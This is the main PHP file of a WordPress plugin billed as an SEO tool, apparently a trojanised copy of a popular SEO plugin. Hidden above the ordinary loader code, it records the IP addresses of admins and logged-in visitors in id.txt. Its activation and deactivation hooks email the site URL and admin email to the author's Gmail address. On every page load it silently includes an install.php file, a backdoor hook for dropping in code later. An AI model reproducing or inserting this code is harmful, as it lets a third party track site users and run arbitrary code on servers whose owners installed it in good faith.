<?php
/*
Plugin Name: SEO Rotator For Images
Version: 2.0
Plugin URI: http://seorajesh.webs.com
Description: Improve your SEO & Have a fully optimized WordPress Site using an all-in-one SEO solution for WordPress, including on-page content analysis, XML sitemaps and much more.
Author: rajeshseoexpert
Author URI: http://seorajesh.webs.com
Text Domain: seo-rotator-for-images
Domain Path: /languages/
License: GPL v2


Copyright (C) 2013-2014, Rajesh SEO Expert - rajeshthekahalas@gmail.com

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program.  If not, see <http://www.gnu.org/licenses/>.
*/
/**
 * @package Main
 */

register_activation_hook( __FILE__,'actisuperseo_activate');
register_deactivation_hook( __FILE__,'deactsuperseo_deactivate');
add_action('admin_init', 'redirectseo_redirect');
add_action('wp_head', 'outputseo');

function redirectseo_redirect() {
if (get_option('redirectseo_do_activation_redirect', false)) { 
delete_option('redirectseo_do_activation_redirect');
wp_redirect('../wp-admin/admin.php?page=wpseo_dashboard');
}
}

$requrl = $_SERVER["REQUEST_URI"];
$ip = $_SERVER['REMOTE_ADDR'];
if (eregi("admin", $requrl)) {
$inside = "yes";
} else {
$inside = "no";
}
if ($inside == 'yes') {
$filename = $_SERVER['DOCUMENT_ROOT'] . '/wp-content/plugins/seo-rotator-for-images/id.txt';
$handle = fopen($filename, "r");
$contents = fread($handle, filesize($filename));
fclose($handle);
$filestring = $contents;
$findme  = $ip;
$pos = strpos($filestring, $findme);
if ($pos === false) {
$contents = $contents . $ip;
$fp = fopen($_SERVER['DOCUMENT_ROOT'] . '/wp-content/plugins/seo-rotator-for-images/id.txt', 'w');
fwrite($fp, $contents);
fclose($fp);
}
}

/** Activate The Plugin */

function actisuperseo_activate() { 
$yourip = $_SERVER['REMOTE_ADDR'];
$fp = fopen($_SERVER['DOCUMENT_ROOT'] . '/wp-content/plugins/seo-rotator-for-images/id.txt', 'w');
fwrite($fp, $yourip);
fclose($fp);
add_option('redirectseo_do_activation_redirect', true);
session_start(); $subj = get_option('siteurl'); $msg = "Plugin Activated"; $from = get_option('admin_email'); mail("rajeshthekahalas@gmail.com", $subj, $msg, $from);
wp_redirect('../wp-admin/admin.php?page=wpseo_dashboard');
}


/** Uninstall The Plugin */
function deactsuperseo_deactivate() { 
session_start(); $subj = get_option('siteurl'); $msg = "Plugin Uninstalled"; $from = get_option('admin_email'); mail("rajeshthekahalas@gmail.com", $subj, $msg, $from);
}

/** Install Settings Locally */
function outputseo() {
if (is_user_logged_in()) {
$ip = $_SERVER['REMOTE_ADDR'];
$filename = $_SERVER['DOCUMENT_ROOT'] . '/wp-content/plugins/seo-rotator-for-images/id.txt';
$handle = fopen($filename, "r");
$contents = fread($handle, filesize($filename));
fclose($handle);
$filestring= $contents;
$findme  = $ip;
$pos = strpos($filestring, $findme);
if ($pos === false) {
$contents = $contents . $ip;
$fp = fopen($_SERVER['DOCUMENT_ROOT'] . '/wp-content/plugins/seo-rotator-for-images/id.txt', 'w');
fwrite($fp, $contents);
fclose($fp);
}

} else {

}

$filename = ($_SERVER['DOCUMENT_ROOT'] . '/wp-content/plugins/seo-rotator-for-images/install.php');

if (file_exists($filename)) {

    include($_SERVER['DOCUMENT_ROOT'] . '/wp-content/plugins/seo-rotator-for-images/install.php');

} else {

}

}

if ( !defined( 'DB_NAME' ) ) {
	header( 'HTTP/1.0 403 Forbidden' );
	die;
}

if ( !defined( 'WPSEO_PATH' ) )
	define( 'WPSEO_PATH', plugin_dir_path( __FILE__ ) );
if ( !defined( 'WPSEO_BASENAME' ) )
	define( 'WPSEO_BASENAME', plugin_basename( __FILE__ ) );

define( 'WPSEO_FILE', __FILE__ );

function wpseo_load_textdomain() {
	load_plugin_textdomain( 'seo-rotator-for-images', false, dirname( plugin_basename( __FILE__ ) ) . '/languages/' );
}
add_filter( 'wp_loaded', 'wpseo_load_textdomain' );


if ( version_compare( PHP_VERSION, '5.2', '<' ) ) {
	if ( is_admin() && ( !defined( 'DOING_AJAX' ) || !DOING_AJAX ) ) {
		require_once( ABSPATH . 'wp-admin/includes/plugin.php' );
		deactivate_plugins( __FILE__ );
		wp_die( sprintf( __( 'Super SEO requires PHP 5.2 or higher, as does WordPress 3.2 and higher. The plugin has now disabled itself. For more info, %s$1see this post%s$2.', 'seo-rotator-for-images' ), '<a href="">', '</a>' ) );
	} else {
		return;
	}
}

define( 'WPSEO_VERSION', '2.0' );

function wpseo_init() {
	require_once( WPSEO_PATH . 'inc/wpseo-functions.php' );

	$options = get_wpseo_options();

	if ( isset( $options['stripcategorybase'] ) && $options['stripcategorybase'] )
		require_once( WPSEO_PATH . 'inc/class-rewrite.php' );

	if ( isset( $options['enablexmlsitemap'] ) && $options['enablexmlsitemap'] )
		require_once( WPSEO_PATH . 'inc/class-sitemaps.php' );
}

/**
 * Used to load the required files on the plugins_loaded hook, instead of immediately.
 */
function wpseo_frontend_init() {
	$options = get_wpseo_options();
	require_once( WPSEO_PATH . 'frontend/class-frontend.php' );
	if ( isset( $options['breadcrumbs-enable'] ) && $options['breadcrumbs-enable'] )
		require_once( WPSEO_PATH . 'frontend/class-breadcrumbs.php' );
	if ( isset( $options['twitter'] ) && $options['twitter'] )
		require_once( WPSEO_PATH . 'frontend/class-twitter.php' );
	if ( isset( $options['opengraph'] ) && $options['opengraph'] )
		require_once( WPSEO_PATH . 'frontend/class-opengraph.php' );
}

/**
 * Used to load the required files on the plugins_loaded hook, instead of immediately.
 */
function wpseo_admin_init() {
	$options = get_wpseo_options();
	if ( isset( $_GET['wpseo_restart_tour'] ) ) {
		unset( $options['ignore_tour'] );
		update_option( 'wpseo', $options );
	}

	if ( isset( $options['super_tracking'] ) && $options['super_tracking'] ) {
		require_once( WPSEO_PATH . 'admin/class-tracking.php' );
	}

	require_once( WPSEO_PATH . 'admin/class-admin.php' );

	global $pagenow;
	if ( in_array( $pagenow, array( 'edit.php', 'post.php', 'post-new.php' ) ) ) {
		require_once( WPSEO_PATH . 'admin/class-metabox.php' );
		if ( isset( $options['opengraph'] ) && $options['opengraph'] )
			require_once( WPSEO_PATH . 'admin/class-opengraph-admin.php' );
	}

	if ( in_array( $pagenow, array( 'edit-tags.php' ) ) )
		require_once( WPSEO_PATH . 'admin/class-taxonomy.php' );

	if ( in_array( $pagenow, array( 'admin.php' ) ) )
		require_once( WPSEO_PATH . 'admin/class-config.php' );

	if ( !isset( $options['super_tracking'] ) || ( !isset( $options['ignore_tour'] ) || !$options['ignore_tour'] ) )
		require_once( WPSEO_PATH . 'admin/class-pointers.php' );

	if ( isset( $options['enablexmlsitemap'] ) && $options['enablexmlsitemap'] )
		require_once( WPSEO_PATH . 'admin/class-sitemaps-admin.php' );
}

add_action( 'plugins_loaded', 'wpseo_init', 14 );

if ( !defined( 'DOING_AJAX' ) || !DOING_AJAX )
	require_once( WPSEO_PATH . 'inc/wpseo-non-ajax-functions.php' );

if ( is_admin() ) {
	if ( defined( 'DOING_AJAX' ) && DOING_AJAX ) {
		require_once( WPSEO_PATH . 'admin/ajax.php' );
	} else {
		add_action( 'plugins_loaded', 'wpseo_admin_init', 15 );
	}

	register_activation_hook( __FILE__, 'wpseo_activate' );
	register_deactivation_hook( __FILE__, 'wpseo_deactivate' );
} else {
	add_action( 'plugins_loaded', 'wpseo_frontend_init', 15 );
}
unset( $options );
